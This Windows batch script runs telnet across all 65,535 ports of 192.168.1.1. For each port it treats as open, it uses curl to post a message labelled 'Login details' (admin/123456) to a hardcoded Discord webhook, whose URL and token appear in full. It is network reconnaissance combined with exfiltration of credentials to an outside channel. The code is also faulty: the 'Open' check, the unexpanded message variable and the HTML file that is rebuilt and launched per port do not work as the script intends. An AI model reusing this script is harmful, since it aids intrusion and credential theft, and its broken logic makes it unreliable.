@echo off
setlocal

REM Scanning for open ports
set IP_ADDRESS=192.168.1.1
set START_PORT=1
set END_PORT=65535

REM Setting up Discord webhook URL
set WEBHOOK_URL=https://discord.com/api/webhooks/1401553505919045683/AR-lPaj90tB6gt9aanhyX36PFMhSBuzquFBmHwGSG__Nw4gd86IQGgTkUPIzQSyj41x5
:LOOP
for /L %%P in (%START_PORT%,1,%END_PORT%) do (
    echo Testing port %%P...
    (echo ^< HTML ^> ^< HEAD ^> ^< TITLE ^>Port Scan Results^</TITLE^> ^</HEAD^> ^< BODY ^>) > temp.html
    telnet %IP_ADDRESS% %%P | find "Open" > NUL
    if errorlevel 1 (
        echo Port %%P is closed.
        (echo ^< p ^>Port %%P is closed.^</p^>) >> temp.html
    ) else (
        echo Port %%P is open.
        (echo ^< p ^>Port %%P is open!^</p^>) >> temp.html
        REM Sending login details to Discord webhook
        set MESSAGE=Login details: Username: admin, Password: 123456
        (echo { "content": "%MESSAGE%" }) > payload.json
        curl -H "Content-Type: application/json" -X POST -d @payload.json %WEBHOOK_URL%
    )
    (echo ^</BODY^> ^</HTML^>) >> temp.html
    start temp.html
)

REM Delay for 5 minutes
timeout /t 300 /nobreak > NUL
goto LOOP

endlocal
